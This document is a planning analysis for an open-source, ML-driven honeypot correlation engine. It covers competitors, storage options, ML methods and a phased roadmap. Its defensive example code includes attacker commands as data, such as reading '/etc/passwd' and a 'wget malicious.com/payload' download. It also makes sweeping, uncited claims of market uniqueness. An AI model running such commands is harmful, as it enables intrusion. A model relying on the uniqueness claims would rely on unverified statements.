# HoneyGraph: AI-Powered Honeypot Correlation Engine
## Market Analysis & Technical Architecture

**Project Concept:** Open-source honeypot correlation engine using Temporal RAG + Adaptive EWMA + HopGraph + Isolation Forest for deceptive security

**Status:** Pre-PRD Analysis
**Last Updated:** 2025-01-11

---

## 🎯 Executive Summary

**The Idea:**
Extract JanuSec's correlation engine (temporal RAG, HopGraph, EWMA, Isolation Forest) and adapt it for honeypot attack analysis with full MITRE/STRIDE/Kill Chain mapping.

**Reality Check: ARE YOU SMOKING CRACK?**

### **NO - This is actually a STRONG idea. Here's why:**

✅ **Real Gap in Market:**
- Existing honeypots (Cowrie, T-Pot, Dionaea) have BASIC logging
- No sophisticated AI/ML correlation for honeypot data
- Attack chain reconstruction is manual
- Threat intelligence enrichment is primitive

✅ **Novel Combination:**
- Temporal RAG for attack pattern analysis (NEW)
- Graph-based attack chain reconstruction (RARE)
- Adaptive ML for attacker profiling (UNDERUSED)
- Cross-framework mapping (MITRE/STRIDE/etc.) (VALUABLE)

✅ **Practical Value:**
- SOC teams deploying honeypots get better intel
- Researchers get attack pattern insights
- Threat intel feeds get enriched data
- Open source = community contribution

✅ **Technical Feasibility:**
- You already have the core components built
- Adapting for honeypot data is straightforward
- Can start minimal and grow

**Verdict: This holds water. Not crack. Proceed with PRD.**

---

## 📊 Market Research: Existing Solutions

### **Current Honeypot Platforms:**

| Platform | Focus | Analytics | AI/ML | Gap Your Project Fills |
|----------|-------|-----------|-------|----------------------|
| **T-Pot** | Multi-honeypot platform | Basic dashboards (Kibana) | ❌ None | No correlation, no AI, no attack chains |
| **Cowrie** | SSH/Telnet honeypot | Log files only | ❌ None | No analysis at all |
| **Dionaea** | Malware capture | Basic logging | ❌ None | No pattern detection |
| **HoneyDB** | Data aggregation | Statistical only | ❌ None | No graph analysis, no ML |
| **Modern Honey Network (MHN)** | Centralized management | Basic stats | ❌ None | No correlation engine |
| **Thinkst Canary** | Commercial deception | Alerting + integrations | ⚠️ Limited | Closed source, basic ML |

### **Key Findings:**

**NO existing open-source solution combines:**
- ✅ Temporal correlation (your EWMA approach)
- ✅ Graph-based attack reconstruction (your HopGraph)
- ✅ AI/ML for pattern detection (your Isolation Forest)
- ✅ RAG for threat intel enrichment (your approach)
- ✅ Multi-framework mapping (MITRE/STRIDE/Kill Chain)

**Closest Commercial:** Thinkst Canary (~$10K/year) has some ML, but:
- Closed source
- Limited correlation
- No graph analysis
- No temporal RAG

**Academic Research:** Some papers on ML for honeypots, but:
- No production implementations
- No open-source releases
- Focus on single techniques (not combined)

**Verdict: Your approach is NOVEL and fills a REAL gap.**

---

## 🏗️ Technical Architecture: What to Extract from JanuSec

### **KEEP (Core Value):**

#### **1. Correlation Engine Core**
```
Components to Extract:
- src/live/correlation_window.py (temporal windowing)
- src/core/detect/beacon_analyzer.py (beaconing detection)
- src/core/detect/domain_tracker.py (domain tracking)
- src/core/detect/egress_tracker.py (connection tracking)
- src/analytics/drift_analyzer.py (adaptive EWMA)

Value: Attack pattern detection over time
Adaptation: Process honeypot logs instead of live events
```

#### **2. HopGraph (Attack Chain Reconstruction)**
```
Components to Extract:
- src/core/graph/hopgraph_lite.py (core graph engine)
- src/core/graph/network_hopgraph.py (network relationships)
- Graph traversal/scoring logic
- TTL-based pruning

Value: Reconstruct multi-stage attacks visually
Adaptation: Node types = IPs, commands, files, ports
```

#### **3. ML Detection (Anomaly Detection)**
```
Components to Extract:
- Isolation Forest implementation
- Clustering logic (K-means)
- Feature extraction
- Adaptive thresholds

Value: Detect novel attack patterns
Adaptation: Train on honeypot-specific features
```

#### **4. Threat Framework Mapping**
```
Components to Extract:
- src/artifact/technique_mapping.py (MITRE mapping)
- src/core/mappings/mitre_stride.py (STRIDE mapping)
- Kill chain stage detection
- DREAD scoring logic

Value: Contextualize attacks in frameworks
Adaptation: Map honeypot activities to tactics
```

#### **5. Factor-Based Scoring**
```
Components to Extract:
- src/artifact/factors.py (factor detection)
- src/artifact/risk.py (risk scoring)
- Factor weight learning
- Confidence calculation

Value: Prioritize high-value attacks
Adaptation: Honeypot-specific factors (e.g., "rare_exploit_attempt")
```

#### **6. Temporal RAG (Novel Component)**
```
Components to Extract:
- Embedding logic (SentenceTransformers)
- Vector clustering
- Context retrieval
- Threat intel enrichment

Value: Enrich attacks with historical context
Adaptation: RAG retrieves similar past attacks + threat intel
```

---

### **REMOVE/SIMPLIFY (Overkill for Open Source):**

#### **1. Compliance Frameworks**
```
Remove:
- SOC 2 audit trails
- ISO 27001 controls
- EU AI Act mappings
- GDPR compliance

Reason: Open-source honeypot doesn't need compliance
Maybe Later: Add as optional module if users request
```

#### **2. Multi-Tenant Architecture**
```
Simplify:
- Remove per-tenant isolation
- Remove tenant-specific configs
- Remove tenant budgeting

Reason: Most deployments will be single-tenant
Keep: Config file for different "zones" (DMZ vs internal)
```

#### **3. Enterprise Features**
```
Remove:
- RBAC (role-based access control)
- SAML/SSO integration
- Advanced audit logging
- SLA tracking

Reason: Open-source doesn't need enterprise auth
Keep: Basic API key authentication
```

#### **4. Cost Optimization**
```
Remove:
- FinOps integration
- Budget gates
- Cost tracking per tenant

Reason: Open-source users don't care about API costs
Keep: Model tier selection (local ML vs API)
```

#### **5. Heavy Integrations**
```
Simplify:
- Remove Slack notifications (add webhook only)
- Remove SIEM integrations (add JSON export)
- Remove ticketing systems

Reason: Users will integrate their own way
Keep: Simple webhook + JSON output
```

---

## 🗄️ Database Architecture: Options Analysis

### **Option 1: PostgreSQL + pgvector (RECOMMENDED)**

**Pros:**
- ✅ Production-ready, battle-tested
- ✅ pgvector extension for embeddings
- ✅ Full SQL capabilities for complex queries
- ✅ JSONB for flexible schema
- ✅ Good performance at scale
- ✅ Easy backup/restore
- ✅ Most users already know Postgres

**Cons:**
- ⚠️ Requires Postgres installation
- ⚠️ Heavier than embedded options

**Best For:** Production deployments, multi-user setups

**Schema Example:**
```sql
CREATE TABLE attacks (
    id UUID PRIMARY KEY,
    timestamp TIMESTAMPTZ,
    source_ip INET,
    honeypot_type TEXT,
    raw_log JSONB,
    embedding VECTOR(384),  -- pgvector
    factors TEXT[],
    risk_score FLOAT
);

CREATE INDEX ON attacks USING ivfflat (embedding vector_cosine_ops);
```

---

### **Option 2: ChromaDB (GOOD for MVP)**

**Pros:**
- ✅ Lightweight, embedded
- ✅ Built for embeddings
- ✅ Simple API
- ✅ Fast setup (pip install)
- ✅ Good for prototyping

**Cons:**
- ⚠️ Less mature than Postgres
- ⚠️ Limited complex query support
- ⚠️ Scalability uncertain

**Best For:** MVP, single-user deployments, demos

---

### **Option 3: SQLite + FAISS (SIMPLEST)**

**Pros:**
- ✅ Zero configuration
- ✅ Single file database
- ✅ FAISS for fast vector search
- ✅ Perfect for small deployments
- ✅ Easy distribution

**Cons:**
- ⚠️ No concurrent writes
- ⚠️ Not for large deployments
- ⚠️ Manual vector index management

**Best For:** Personal use, research, small labs

---

### **Option 4: Qdrant (SPECIALIZED)**

**Pros:**
- ✅ Vector-native database
- ✅ Excellent performance
- ✅ Built for semantic search
- ✅ Good API
- ✅ Clustering support

**Cons:**
- ⚠️ Another service to run
- ⚠️ Less familiar to users
- ⚠️ Overkill for small deployments

**Best For:** Large-scale deployments, enterprise

---

### **Option 5: Weaviate (FULL-FEATURED)**

**Pros:**
- ✅ Full vector database
- ✅ Built-in ML models
- ✅ GraphQL API
- ✅ Good documentation

**Cons:**
- ⚠️ Heavy (resource intensive)
- ⚠️ Complex setup
- ⚠️ Overkill for this use case

**Best For:** Complex multi-modal applications

---

### **RECOMMENDATION: Tiered Approach**

**MVP (Phase 1):** SQLite + in-memory FAISS
- Fast to build
- Zero config
- Easy to demo

**Production (Phase 2):** PostgreSQL + pgvector
- Scales well
- Familiar to ops teams
- Production-grade

**Enterprise (Phase 3):** Qdrant as optional backend
- For users needing scale
- Separate Docker container
- Config flag to switch

**Implementation:**
```python
# Database abstraction layer
class StorageBackend:
    @abstractmethod
    def store_attack(self, attack: Attack): ...
    @abstractmethod
    def search_similar(self, embedding: np.ndarray, k: int): ...
    @abstractmethod
    def get_graph_context(self, node_id: str): ...

class SQLiteBackend(StorageBackend): ...
class PostgresBackend(StorageBackend): ...
class QdrantBackend(StorageBackend): ...
```

---

## 🤖 AI/ML Approaches: Beyond Current Implementation

### **Currently Planned (From JanuSec):**

1. **Isolation Forest** - Anomaly detection
2. **K-means Clustering** - Attack grouping
3. **EWMA** - Temporal drift detection
4. **Embeddings** - Semantic similarity

### **ADDITIONAL ML Approaches to Consider:**

#### **1. Sequence Models (Attack Prediction)**

**Technique:** LSTM or Transformer for command sequence analysis

**Use Case:** Predict next attacker move
```python
# Example
attack_sequence = ["ssh_login", "whoami", "ls", "cat /etc/passwd"]
model.predict_next(attack_sequence)
# → "wget malicious.com/payload"
```

**Value:**
- Proactive defense recommendations
- Attacker behavior modeling
- Campaign detection

**Complexity:** Medium
**ROI:** High (very novel)

---

#### **2. Graph Neural Networks (Attack Chain Prediction)**

**Technique:** GNN (GraphSAGE or GAT) on HopGraph

**Use Case:** Predict attack path progression
```python
# Example
current_graph = HopGraph([ip1 -> port22 -> login -> pivot])
gnn.predict_next_edge(current_graph)
# → "pivot -> internal_host"
```

**Value:**
- Attack path forecasting
- Lateral movement detection
- Campaign attribution

**Complexity:** High
**ROI:** High (cutting edge, publishable)

---

#### **3. Behavioral Clustering (Attacker Profiling)**

**Technique:** Time-series clustering (DTW or shapelets)

**Use Case:** Group attackers by behavior patterns
```python
# Example
attacker_profile = {
    "commands": ["nmap", "metasploit", "reverse_shell"],
    "timing": [0, 120, 180],  # seconds
    "tools": ["nmap", "msf"]
}
cluster = behavioral_cluster(attacker_profile)
# → "APT-style attacker" vs "Script kiddie"
```

**Value:**
- Attacker attribution
- Threat actor tracking
- Pattern-based alerting

**Complexity:** Medium
**ROI:** Medium (useful but not novel)

---

#### **4. Anomaly Detection Ensemble**

**Technique:** Combine multiple anomaly detectors

**Models:**
- Isolation Forest (current)
- One-Class SVM
- Local Outlier Factor (LOF)
- Autoencoder

**Use Case:** Catch diverse attack types
```python
ensemble = AnomalyEnsemble([
    IsolationForest(),
    OneClassSVM(),
    LOF(),
    Autoencoder()
])
anomaly_score = ensemble.predict(attack_features)
```

**Value:**
- Robust detection (reduces false negatives)
- Covers different anomaly types

**Complexity:** Low-Medium
**ROI:** Medium (incremental improvement)

---

#### **5. LLM-Based Threat Intelligence RAG**

**Technique:** RAG with threat intel feeds + LLM reasoning

**Use Case:** Enrich attacks with context
```python
# Example
attack = "ssh login from 1.2.3.4 with user 'admin'"
context = rag.retrieve_threat_intel("1.2.3.4")
llm_analysis = llm.analyze(attack, context)
# → "IP associated with APT29, typical credential stuffing pattern"
```

**Value:**
- Automatic threat intel correlation
- Natural language attack summaries
- Actionable recommendations

**Complexity:** Medium (you already have RAG)
**ROI:** High (very useful for analysts)

---

#### **6. Reinforcement Learning (Adaptive Honeypots)**

**Technique:** RL agent adapts honeypot responses

**Use Case:** Make honeypot more convincing
```python
# Example
rl_agent.observe(attacker_action="cat /etc/passwd")
response = rl_agent.select_response(
    options=["show_fake_passwd", "delay", "error"]
)
# → Learns which responses keep attackers engaged longer
```

**Value:**
- Adaptive deception (very novel)
- Longer attacker engagement = more intel
- Published research potential

**Complexity:** High
**ROI:** Very High (groundbreaking if done well)

---

#### **7. Federated Learning (Multi-Honeypot Network)**

**Technique:** Learn from multiple honeypots without sharing raw data

**Use Case:** Collaborative threat detection
```python
# Each honeypot trains local model, shares gradients only
local_model.train(local_honeypot_data)
gradients = local_model.get_gradients()
global_model.aggregate([grad1, grad2, grad3])
```

**Value:**
- Privacy-preserving collaboration
- Better models from more data
- Novel research angle

**Complexity:** High
**ROI:** Medium (more research than practical)

---

### **RECOMMENDED ML Roadmap:**

**Phase 1 (MVP):**
- ✅ Isolation Forest (you have)
- ✅ EWMA drift detection (you have)
- ✅ Embeddings + clustering (you have)

**Phase 2 (Differentiation):**
- ✅ Sequence models (LSTM for command prediction)
- ✅ LLM-based threat intel RAG
- ✅ Behavioral clustering

**Phase 3 (Research/Advanced):**
- ✅ Graph Neural Networks (attack path prediction)
- ✅ Reinforcement Learning (adaptive responses)
- ✅ Anomaly detection ensemble

**Phase 4 (Moonshot):**
- ✅ Federated learning across honeypot network

---

## 🎯 What Should HoneyGraph Include?

### **MUST HAVE (Core Features):**

✅ **1. Attack Data Ingestion**
- Parse logs from Cowrie, Dionaea, T-Pot
- Normalize to common schema
- Real-time + batch processing

✅ **2. Temporal Correlation**
- Sliding window analysis
- EWMA-based drift detection
- Campaign identification

✅ **3. HopGraph Attack Chains**
- Visual attack reconstruction
- Multi-hop traversal
- TTL-based pruning
- Export as graph (DOT, JSON)

✅ **4. ML Anomaly Detection**
- Isolation Forest
- Adaptive thresholds
- Novelty scoring

✅ **5. Threat Framework Mapping**
- MITRE ATT&CK (must have)
- Kill Chain stages
- STRIDE (optional)
- PASTA (optional)

✅ **6. Factor-Based Scoring**
- Risk score calculation
- Confidence levels
- Prioritization

✅ **7. Temporal RAG**
- Embed attacks semantically
- Retrieve similar historical attacks
- Threat intel enrichment

✅ **8. API + Web UI**
- REST API for integrations
- Simple web dashboard
- Graph visualization (Cytoscape.js or D3)

✅ **9. Exports**
- JSON for SIEM integration
- STIX/TAXII for threat intel sharing
- CSV for analysis

---

### **NICE TO HAVE (Stretch Goals):**

⚠️ **10. Sequence Prediction (Phase 2)**
- LSTM for next-command prediction
- Attacker behavior modeling

⚠️ **11. Attacker Profiling (Phase 2)**
- Behavioral clustering
- Threat actor attribution

⚠️ **12. LLM Analysis (Phase 2)**
- Natural language attack summaries
- Automatic recommendations

⚠️ **13. GNN Attack Prediction (Phase 3)**
- Attack path forecasting
- Research feature

⚠️ **14. Adaptive Honeypots (Phase 3)**
- RL-based response selection
- Moonshot feature

---

### **SKIP (Not Worth It):**

❌ **Compliance Frameworks** - Overkill for open source
❌ **Multi-Tenancy** - Adds complexity
❌ **Enterprise Auth** - Use API keys only
❌ **Cost Tracking** - Not relevant
❌ **Heavy SIEM Integrations** - Users will DIY

---

## 🚀 Competitive Positioning

### **How HoneyGraph Differentiates:**

| Feature | T-Pot | Cowrie | HoneyDB | Thinkst Canary | **HoneyGraph** |
|---------|-------|--------|---------|----------------|----------------|
| **Open Source** | ✅ Yes | ✅ Yes | ✅ Yes | ❌ No | ✅ **Yes** |
| **AI/ML Correlation** | ❌ No | ❌ No | ❌ No | ⚠️ Basic | ✅ **Advanced** |
| **Attack Chain Graphs** | ❌ No | ❌ No | ❌ No | ❌ No | ✅ **Yes (HopGraph)** |
| **Temporal Analysis** | ❌ No | ❌ No | ⚠️ Basic | ⚠️ Basic | ✅ **Yes (EWMA)** |
| **Threat Intel RAG** | ❌ No | ❌ No | ❌ No | ❌ No | ✅ **Yes (Novel)** |
| **MITRE Mapping** | ⚠️ Manual | ❌ No | ❌ No | ✅ Yes | ✅ **Automatic** |
| **Anomaly Detection** | ❌ No | ❌ No | ❌ No | ⚠️ Basic | ✅ **Isolation Forest** |
| **Multi-Framework** | ❌ No | ❌ No | ❌ No | ❌ No | ✅ **MITRE/STRIDE/Kill Chain** |
| **Price** | Free | Free | Free | ~$10K/yr | **Free** |

**Unique Selling Points:**
1. **Only open-source tool with graph-based attack reconstruction**
2. **Only tool with temporal RAG for threat intel**
3. **Only tool with adaptive ML correlation**
4. **Only tool with multi-framework mapping (MITRE + STRIDE + Kill Chain)**

---

## 🏆 Use Cases & Target Users

### **Primary Use Cases:**

**1. SOC Teams**
- Deploy honeypots for early warning
- Get ML-powered attack analysis
- Visualize attack campaigns
- Export to SIEM

**2. Security Researchers**
- Collect attacker TTP data
- Analyze attack patterns
- Publish research papers
- Share threat intel

**3. Threat Intel Teams**
- Enrich intel feeds with honeypot data
- Track threat actor campaigns
- Attribution via behavioral analysis
- STIX/TAXII sharing

**4. Red Teams**
- Understand attacker behavior
- Test defensive detections
- Learn real-world TTPs
- Training scenarios

**5. Academic Research**
- ML on honeypot data
- Attack prediction models
- Deception effectiveness studies
- Publish papers

---

### **Target Users:**

**Primary:**
- 🎯 Security researchers (high technical skill)
- 🎯 SOC analysts (medium-high skill)
- 🎯 Threat intel analysts (high skill)

**Secondary:**
- 🎯 Red teamers
- 🎯 Academic researchers
- 🎯 Honeypot operators

**Not Target:**
- ❌ Non-technical users (too complex)
- ❌ Enterprise buyers (open source focus)
- ❌ Compliance-driven orgs (removed that)

---

## 💡 Novel Research Angles

### **Publishable Research Contributions:**

**1. Temporal RAG for Honeypot Analysis**
- Novel application of RAG to security
- Paper: "Temporal RAG for Attack Pattern Recognition in Honeypots"
- Venue: IEEE S&P, NDSS, USENIX Security

**2. HopGraph Attack Reconstruction**
- Graph-based attack chain modeling
- Paper: "HopGraph: Graph-Based Attack Chain Reconstruction from Honeypot Data"
- Venue: CCS, ACSAC

**3. Adaptive EWMA for Threat Detection**
- Dynamic threshold adjustment
- Paper: "Adaptive EWMA for Real-Time Threat Detection in Deception Environments"
- Venue: RAID, AISec

**4. Multi-Framework Attack Mapping**
- Automatic MITRE + STRIDE + Kill Chain
- Paper: "Unified Threat Framework Mapping for Honeypot Intelligence"
- Venue: CyCon, MILCOM

**5. GNN for Attack Path Prediction** (Phase 3)
- Cutting-edge ML
- Paper: "Predicting Attacker Behavior with Graph Neural Networks"
- Venue: NeurIPS, ICLR (ML venues)

**6. RL for Adaptive Honeypots** (Phase 3)
- Reinforcement learning in security
- Paper: "Adaptive Deception: Reinforcement Learning for Dynamic Honeypot Responses"
- Venue: IEEE S&P, CCS

---

## ⚠️ Risks & Challenges

### **Technical Risks:**

**1. Data Quality**
- Honeypot logs are noisy
- Many automated scans (boring)
- Need good filtering

**Mitigation:** Focus on "interesting" attacks (manual exploitation, lateral movement)

**2. Scalability**
- Graph can grow large
- Vector search can be slow

**Mitigation:** TTL-based pruning, efficient indexing, tiered storage

**3. Model Training**
- Need labeled data for some ML
- Cold-start problem

**Mitigation:** Start with unsupervised (Isolation Forest), add supervised later

**4. False Positives**
- ML might flag benign probes

**Mitigation:** Confidence scores, human-in-loop validation

---

### **Market Risks:**

**1. Adoption**
- Open source needs community
- Competing with established tools

**Mitigation:** Strong differentiation (AI/ML), good docs, active marketing

**2. Maintenance Burden**
- You'll need to support users
- Bug reports, feature requests

**Mitigation:** Clear roadmap, community contributions, limit scope initially

**3. Commercial Pressure**
- Thinkst Canary might see you as competitor

**Mitigation:** Position as complementary (open source, research-focused)

---

## ✅ GO/NO-GO Decision Framework

### **GO if:**

✅ You can dedicate 10+ hours/week for 6 months
✅ JanuSec IP remains yours (confirmed)
✅ You're excited about community engagement
✅ You want to publish research papers
✅ You're okay with initial slow adoption

### **NO-GO if:**

❌ You can't commit time
❌ IP ownership unclear
❌ You hate community support
❌ You need immediate revenue
❌ You want guaranteed adoption

---

## 🎯 Recommendation: YES, DO IT

### **Why This Is a Good Idea:**

1. **Market Gap:** No other tool combines AI/ML + graphs + temporal analysis for honeypots
2. **Technical Feasibility:** You have 80% of code already
3. **Differentiation:** Novel enough to attract users and publish papers
4. **Open Source Value:** Community will benefit, you get recognition
5. **Career Value:** Portfolio piece for Gen AI Architect roles
6. **Research Potential:** Multiple publishable papers
7. **Low Risk:** Worst case = learning experience and portfolio project

### **Why NOT Smoking Crack:**

✅ Real market need (honeypots lack good analytics)
✅ Novel technical approach (temporal RAG + graphs + ML)
✅ Feasible scope (extract from JanuSec)
✅ Clear differentiation (vs T-Pot, Cowrie, etc.)
✅ Research value (publishable)
✅ Career value (demo for interviews)

**This is LEGIT. Not crack. Not dung. This is a viable project.**

---

## 📋 Next Steps: PRD Outline

See separate document: `HONEYGRAPH_PRD.md`

---

## 🤔 Final Thoughts

**Is this deceptive offensive security architecture AI/ML idea valid?**

**YES.** Here's why:

1. **Deception is underserved:** Most honeypots are "deploy and forget" with basic logging
2. **AI/ML adds real value:** Pattern detection, attack prediction, threat intel
3. **Architecture is sound:** Temporal + graph + ML is proven in other domains
4. **Differentiation is clear:** No open-source competitor does this
5. **Research is novel:** Multiple paper opportunities
6. **Career value:** Strong portfolio piece

**What else to consider before PRD:**

1. **Time commitment:** Can you dedicate 10 hrs/week for 6 months?
2. **Community building:** Will you engage users, write docs, fix bugs?
3. **Scope management:** Can you resist feature creep?
4. **IP ownership:** Is Cyberstash agreement clear?
5. **Revenue model:** Pure open source or commercial support later?

**My Recommendation:**

**DO IT.** Start with MVP (SQLite + core correlation + HopGraph), release early, iterate based on feedback. This is a strong project with real value.

---

**Next Action:** Draft PRD with phased approach (MVP → Production → Research)

